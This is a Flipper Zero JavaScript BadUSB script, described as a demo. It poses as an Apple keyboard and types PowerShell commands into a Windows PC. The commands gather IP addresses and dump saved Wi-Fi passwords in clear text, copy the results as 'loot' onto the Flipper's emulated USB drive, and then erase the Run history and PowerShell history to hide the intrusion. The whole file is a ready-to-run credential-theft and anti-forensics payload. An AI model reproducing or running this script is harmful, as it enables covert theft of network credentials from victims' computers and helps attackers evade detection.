// JavaScript demo of running Windows powershell scripts.  This
// demo is based on lots of the previous scripts that were shared
// in the Momentum Discord channel.

// The payloads in this script were demonstrated in 
// Talking Sasquach's video https://youtu.be/8USI98_5GeU?t=447
//
// The improvements are:
// - Populating the USB drive with payloads.
// - PowerShell polling for the USB drive to be attached.
// - Badusb using keyboard layouts (handling non-US keyboards).
// - Copying a file from USB to local drive.
// - Playing an MP3 file.
// - PowerShell ejecting the USB drive when done.
// - Displaying the results on the Flipper screen.

// For documentation on configuration see:
// https://github.com/jamisonderek/flipper-zero-tutorials/blob/main/js/badusb/README.md

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let textbox = require("textbox");

// ************
// IMPORTANT: Be sure this matches your computer keyboard layout!!!
// See /ext/badusb/assets/layouts/ for list of supported keyboard layouts.
let layout = "en-US";

// Local file to store system information.
let localTempFolder = "flipper";
let localFileName = "info.txt";

// Update this script to include the commands you want to run.
let script = [
  "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> " + localFileName + ";",
  "(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:([A-Za-z ]+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> " + localFileName + ";",
  // "dir env: >> " + localFileName + ";",
];

// Payload to copy from the SD card to the USB drive.
let copyPayload = true;
let playPayload = true;
let payloadName = "demo.mp3";
let payloadSrcName = __dirpath + "/payloads/" + payloadName;
let payloadDstName = "/mnt/" + payloadName;

// All the loot will be stored in this file.
let lootFile = __dirpath + "/loot.txt";

// Image to store payloads and results.
let exfilCapacityMb = 4; // Reserve space for our image (payloads and results).
let image = __dirpath + "/Demo_" + to_string(exfilCapacityMb) + "MB.img";
let flipperStorageName = "Flipper Mass Storage";

// Folder and file to store the results on SD card.
let resultFolder = "results";
let resultFileName = "info.txt";

print("Checking for Image...");
if (storage.exists(image)) {
  storage.remove(image);
}
print("Creating Storage...");
usbdisk.createImage(image, exfilCapacityMb * 1024 * 1024);

if (copyPayload) {
  print("Copying Payload...")
  storage.virtualInit(image);
  storage.virtualMount();
  storage.copy(payloadSrcName, payloadDstName);
  storage.virtualQuit();
}

badusb.setup({
  vid: 0x1234,
  pid: 0x5678,
  mfr_name: "Apple",
  prod_name: "Keyboard",
  layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl"
});
print("Waiting for connection");
while (!badusb.isConnected()) {
  delay(1000);
}

// Launch powershell
print("Launching powershell");
delay(3000);
badusb.press("GUI", "x");
delay(500);
badusb.press("i");
delay(3000);

print("Running commands");
badusb.print(" md " + localTempFolder + "; cd " + localTempFolder + "; ");
for (let i = 0; i < script.length; i++) {
  badusb.print(script[i]);
}
badusb.press("ENTER");
badusb.press("ENTER");

// Wait for attached drive, assign to $DriveLetter
badusb.print(" $FlipperStorage = '" + flipperStorageName + "';");
badusb.print(" do {");
badusb.print(" Start-Sleep 1;");
badusb.print(" $Disks = Get-Disk;");
badusb.print(" $DiskNames = $Disks | Select-Object -Property Number,FriendlyName;");
badusb.print(" $DiskNumber = $DiskNames | Where-Object -FilterScript { ($_.FriendlyName) -eq $FlipperStorage} | Select-Object -ExpandProperty Number;");
badusb.print(" } while ($DiskNumber -lt 0);")
badusb.print(" $DriveLetter = Get-Partition -DiskNumber ${DiskNumber} | Select-Object -ExpandProperty DriveLetter;");

// Copy file from USB drive locally.
if (copyPayload) {
  badusb.print(" $Payload = ${DriveLetter} + ':\\" + payloadName + "';");
  badusb.print(" Copy-Item -Path $Payload;");
}

// Play the MP3 payload file.
if (playPayload) {
  badusb.print("Add-Type -AssemblyName presentationCore;");
  badusb.print(" $mediaPlayer = New-Object system.windows.media.mediaplayer;");
  badusb.print(" $song = Get-Location | Select-Object -ExpandProperty Path;");
  badusb.print(" $song = $song+'\\" + payloadName + "';")
  badusb.print(" $mediaPlayer.open($song);");
  badusb.print(" $mediaPlayer.Play();");
}

// Move file onto SD card
if (script.length > 0) {
  badusb.print(" $LocalFile = '" + localFileName + "';");
  badusb.print(" New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\" + resultFolder + "\\;");
  badusb.print(" Move-Item -Path $LocalFile -Destination ${DriveLetter}:\\" + resultFolder + "\\" + resultFileName + ";");
  badusb.print(" Start-Sleep 1;");
}

// Eject drive
badusb.print(" $eject = New-Object -comObject Shell.Application;");
badusb.print(" $eject.Namespace(17).ParseName($DriveLetter+':').InvokeVerb('Eject');");

// Hide tracks
badusb.print(" cd ..;");
badusb.print(" Remove-Item " + localTempFolder + " -Force -Recurse;");
badusb.print(" reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;");
badusb.print(" Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;");
badusb.press("ENTER");
delay(500);

// Close window & detach keyboard
badusb.press("ENTER");
badusb.print(" Start-Sleep 10; exit");
badusb.press("ENTER");
badusb.quit();

// Wait for badusb to finish typing.
print("Waiting for typing to finish...");
delay(5 * 1000);

// Attach storage
print("Attaching storage...");
usbdisk.start(image);

// Wait for storage to be detached from script
print("Waiting for storage to detatch...");
while (!usbdisk.wasEjected()) {
  delay(1000);
}
usbdisk.stop();

// Done
print("Detached disk.");
delay(1000);

// Mount and display loot
if (script.length > 0) {
  print("Reading loot...");
  storage.virtualInit(image);
  storage.virtualMount();
  delay(1000);
  let data = storage.read("/mnt/" + resultFolder + "/" + resultFileName);
  textbox.setConfig("start", "text");
  textbox.emptyText();
  let data_view = Uint8Array(data);
  for (let i = 0; i < data_view.length; i++) {
    textbox.addText(chr(data_view[i]));
  }
  data_view = undefined;
  textbox.addText("\n");
  textbox.show();
  print("Copying to loot file.");
  storage.append(lootFile, data);
  print("Displaying results.");
  while (textbox.isOpen()) {
    delay(1000);
  }
  textbox.emptyText();
  storage.virtualQuit();
}

print("Done.");